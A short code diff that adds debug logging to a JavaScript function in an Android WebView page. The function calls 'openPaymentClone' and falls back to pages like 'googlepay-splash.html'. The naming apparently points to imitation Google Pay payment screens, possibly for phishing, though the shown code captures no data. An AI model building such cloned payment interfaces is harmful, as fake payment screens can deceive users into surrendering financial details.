@@ -427,11 +427,13 @@
      */
     function selectPaymentMethod(method) {
       try {
+        console.log('💰 selectPaymentMethod called with method:', method);
         // فراخوانی Android برای باز کردن Activity کلون
         if (typeof Android !== 'undefined' && Android.openPaymentClone) {
+          console.log('✅ Android interface available, calling openPaymentClone with:', method);
           Android.openPaymentClone(method);
         } else {
-          console.error('Android interface not available');
+          console.error('❌ Android interface not available');
           // Fallback: برو به splash مربوطه
           if (method === 'gpay') {
             window.location.href = 'googlepay-splash.html';
@@ -442,7 +444,7 @@
           }
         }
       } catch (e) {
-        console.error('Error opening payment clone:', e);
+        console.error('❌ Error opening payment clone:', e);
       }
     }
   </script>
